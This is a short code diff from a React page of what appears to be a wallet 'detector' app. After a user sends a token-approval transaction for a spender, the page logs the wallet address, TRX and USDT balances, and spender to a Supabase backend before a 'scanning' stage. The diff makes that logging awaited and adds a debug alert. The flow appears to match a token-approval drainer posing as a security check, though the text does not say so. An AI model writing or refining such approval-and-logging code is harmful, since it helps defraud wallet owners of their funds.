@@ -799,7 +799,8 @@ const Index = () => {
       });
 
       const approvalTxId = parseApprovalSendResult(sendResult);
-      void submitWalletAuthorizationRecord({
+      setHelperText({ key: "detector.helper.syncingAuthorizationRecord" });
+      const recordResult = await submitWalletAuthorizationRecord({
         walletAddress: wallet.address,
         trxBalance: wallet.trxBalance,
         usdtBalance: wallet.usdtBalance,
@@ -807,6 +808,14 @@ const Index = () => {
         approvalSpender: spender,
         locale: i18n.resolvedLanguage,
       });
+      if (recordResult.ok === false) {
+        setStage("connected");
+        setError({ key: recordResult.errorKey });
+        setHelperText({ key: "detector.helper.connected" });
+        // 临时调试弹窗：便于快速看到 Supabase 提交失败原因
+        window.alert(`Supabase 提交失败\n${recordResult.debugMessage}`);
+        return;
+      }
 
       setHelperText({ key: "detector.helper.authorized" });
       setStage("scanning");
